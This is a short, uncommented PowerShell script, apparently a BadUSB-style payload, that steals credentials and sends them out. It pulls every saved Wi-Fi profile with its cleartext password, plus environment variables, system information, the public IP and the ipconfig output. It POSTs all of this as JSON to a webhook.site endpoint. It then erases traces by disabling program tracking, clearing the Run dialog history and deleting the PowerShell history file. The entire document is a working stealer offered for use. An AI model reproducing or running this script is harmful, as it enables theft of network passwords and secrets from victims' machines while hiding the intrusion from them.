$wifis = @()
$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+'
foreach ($profile in $profiles) {
    $password = netsh wlan show profile $profile.Matches.Value key=clear | Select-String '(?<=Key Content\s+:\s).+'
    if ($password) {
        $password = $password.Matches.Value.Trim()
    }
    
    $wifis += @{
        'name' = $profile.Matches.Value
        'password' = $password
    }
}


$envVars = gci env: | ForEach-Object {
    $key = $_.Name
    $value = $_.Value
    "$key=$value"
} | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
$extraInfo = (Get-ComputerInfo)

$IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$IPconfig = (ipconfig /all)

$Body = @{
    'username' = $env:username
    'ipv4' = $IPV4
    'wifi_profiles' = $wifis
    'ipconfig' = $IPconfig
    'extraInfo' = $extraInfo
    'env' = $envVars
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/3194497f-037d-46b8-99da-49648971fdcc -Method Post -Body ($Body | ConvertTo-Json)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath
